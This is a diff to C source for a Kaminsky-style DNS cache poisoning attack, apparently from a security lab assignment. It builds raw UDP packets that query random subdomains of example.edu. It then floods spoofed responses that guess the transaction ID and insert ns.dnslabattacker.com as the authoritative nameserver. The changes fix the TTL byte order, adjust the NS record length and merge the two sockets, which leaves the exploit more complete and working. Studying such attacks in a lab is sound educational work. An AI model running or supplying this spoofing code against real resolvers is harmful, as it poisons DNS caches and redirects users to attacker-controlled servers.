@@ -14,8 +14,6 @@
 #define FLAG_R 0x8400
 #define FLAG_Q 0x0100
 
-// Can create separate header file (.h) for all headers' structure
-
 // The IP header's structure
 struct ipheader
 {
@@ -120,10 +118,6 @@ int main(int argc, char *argv[])
         exit(-1);
     }
 
-    // socket descriptor
-    int sd;
-    int sdResponse;
-
     // buffer to hold the packet
     char buffer[PCKT_LEN];
     char bufferResponse[PCKT_LEN];
@@ -151,12 +145,13 @@ int main(int argc, char *argv[])
     ////////////////////////////////////////////////////////////////////////
 
     // Construct Query's DNS header
+
     dns->query_id = rand();     // transaction ID for the query packet, use random number
     dns->flags = htons(FLAG_Q); // the flag you need to set
     dns->QDCOUNT = htons(1);    // only 1 query, so the count should be one.
 
     // Construct Response's DNS header
-    // dnsResponse->query_id = rand(); // must be guess this 16-bit in the spoofing session
+
     dnsResponse->flags = htons(FLAG_R);
     dnsResponse->QDCOUNT = htons(1);
     dnsResponse->ANCOUNT = htons(1);
@@ -164,14 +159,16 @@ int main(int argc, char *argv[])
     dnsResponse->ARCOUNT = htons(0);
 
     // Construct Query's payload
+
     strcpy(data, "\5aaaaa\7example\3edu"); // query string
     int length = strlen(data) + 1;
 
-    struct dataEnd *end = (struct dataEnd *)(data + length); // this is for convinience to get the struct type write the 4bytes in a more organized way.
+    struct dataEnd *end = (struct dataEnd *)(data + length);
     end->type = htons(1);
     end->class = htons(1);
 
     // Construct Response's payload:
+
     // 1. QUESTION record: | name | dataEnd(4) |
     char *questionStart = dataResponse;
     strcpy(dataResponse, "\5aaaaa\7example\3edu");
@@ -184,7 +181,6 @@ int main(int argc, char *argv[])
 
     // 2. ANSWER record:  | name | dataEnd(4) | ttl(4) | len(2) | ip |
     dataResponse += sizeof(struct dataEnd);
-    printf("\nDEBUG: written QUESTION = %d bytes\n", dataResponse - questionStart);
     char *answerStart = dataResponse;
     strcpy(dataResponse, "\5aaaaa\7example\3edu");
     lengthResponse = strlen(dataResponse) + 1;
@@ -195,7 +191,7 @@ int main(int argc, char *argv[])
     endResponse->class = htons(1); // 2 bytes
 
     dataResponse += sizeof(struct dataEnd);
-    *(long *)dataResponse = htons(2000); // 4 bytes, ttl = 0x00002000
+    *(long *)dataResponse = htonl(2000); // 4 bytes, ttl = 0x00002000
 
     dataResponse += sizeof(long);
     *(short int *)dataResponse = htons(4); // 2 bytes, data length = 0x0004
@@ -203,10 +199,8 @@ int main(int argc, char *argv[])
     dataResponse += sizeof(short int);
     *(unsigned int *)dataResponse = inet_addr("1.2.3.4");
 
-    // 3. authority record:
-    // | name | dataEnd(4) | ttl(4) | len(2) | NS |
+    // 3. AUTHORITY record: | name | dataEnd(4) | ttl(4) | len(2) | NS |
     dataResponse += sizeof(unsigned int);
-    printf("\nDEBUG: written ANSWER = %d bytes\n", dataResponse - answerStart);
     char *authStart = dataResponse;
     strcpy(dataResponse, "\7example\3edu");
     lengthResponse = strlen(dataResponse) + 1;
@@ -217,27 +211,22 @@ int main(int argc, char *argv[])
     endResponse->class = htons(1);
 
     dataResponse += sizeof(struct dataEnd);
-    *(long *)dataResponse = htons(2000); // 4 bytes, ttl = 0x00002000
+    *(long *)dataResponse = htonl(2000); // 4 bytes, ttl = 0x00002000
 
     dataResponse += sizeof(long);
-    *(short int *)dataResponse = htons(13); // 2 bytes, data length = 0x0013
+    *(short int *)dataResponse = htons(23); // 2 bytes, data length = 0x0013
 
     dataResponse += sizeof(short int);
-    // strcpy(dataResponse, "\2ns\aattacker32\x03com\x00");
-    strcpy(dataResponse, "\2ns\15dnsattacker32\3com");
+    strcpy(dataResponse, "\2ns\16dnslabattacker\3com");
     lengthResponse = strlen(dataResponse) + 1;
 
     dataResponse += lengthResponse;
     lengthResponse = dataResponse - questionStart;
 
-    printf("\nDEBUG: written AUTHORITY = %d bytes\n", dataResponse - authStart);
-
     //DEBUG:
     printf("\nDEBUG: response = ");
     for (int i = 0; i < dataResponse - questionStart; i++)
-    {
         printf("%c", *(questionStart + i));
-    }
     printf("\n");
 
     /////////////////////////////////////////////////////////////////////
@@ -253,16 +242,6 @@ int main(int argc, char *argv[])
 
     // Source and destination addresses: IP and port
     struct sockaddr_in sin, din;
-
-    int one = 1;
-    const int *val = &one;
-
-    // Create a raw socket with UDP protocol
-    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
-    sdResponse = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
-
-    if (sd < 0 || sdResponse < 0)
-        printf("ERROR: socket error\n");
 
     // The address family
     sin.sin_family = AF_INET;
@@ -349,44 +328,44 @@ int main(int argc, char *argv[])
     ipheader_size + udpheader_size
   *********************************************************************************/
 
+    // Create a raw socket with UDP protocol
+    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (sd < 0)
+        printf("ERROR: socket error\n");
+
     // Create raw socket
+    int one = 1;
+    const int *val = &one;
     if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
         printf("ERROR: query socket creation error\n");
         exit(-1);
     }
-    if (setsockopt(sdResponse, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-    {
-        printf("ERROR: response socket creation error\n");
-        exit(-1);
-    }
 
     while (1)
     {
-        // Generate different query in xxxxx.example.edu
-        int charnumber;
-        charnumber = 1 + rand() % 5;
-        *(data + charnumber) += 1;
+        int charnumber = 1 + rand() % 5;
+        *(data + charnumber) += 1;                                                        // Set name in query with random string
+        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // Recalculate checksum for UDP packet
 
-        // Recalculate checksum for UDP packet
-        udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
-
-        // Send packet
-        printf("DEBUG: sent QUERY!\n");
+        // Send query packet
         if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
-            printf("packet send error %d which means %s\n", errno, strerror(errno));
+        {
+            printf("ERROR: packet send error %d which means %s\n", errno, strerror(errno));
+        }
 
-        printf("DEBUG: start spoofing RESPONSE!\n");
+        *(questionStart + charnumber) += 1; // Set name in question record
+        *(answerStart + charnumber) += 1;   // Set name in answer record
+
         for (int i = 0; i < 100; i++)
         {
-            dnsResponse->query_id = rand();
-            *(questionStart + charnumber) += 1;
-            *(answerStart + charnumber) += 1;
+            dnsResponse->query_id = rand(); // Guess transation ID
             udpResponse->udph_chksum = check_udp_sum(bufferResponse, packetLengthResponse - sizeof(struct ipheader));
-            if (sendto(sdResponse, bufferResponse, packetLengthResponse, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+
+            // Send response packet
+            if (sendto(sd, bufferResponse, packetLengthResponse, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                 printf("ERROR: packet send error %d which means %s\n", errno, strerror(errno));
         }
-        sleep(3);
     }
 
     close(sd);
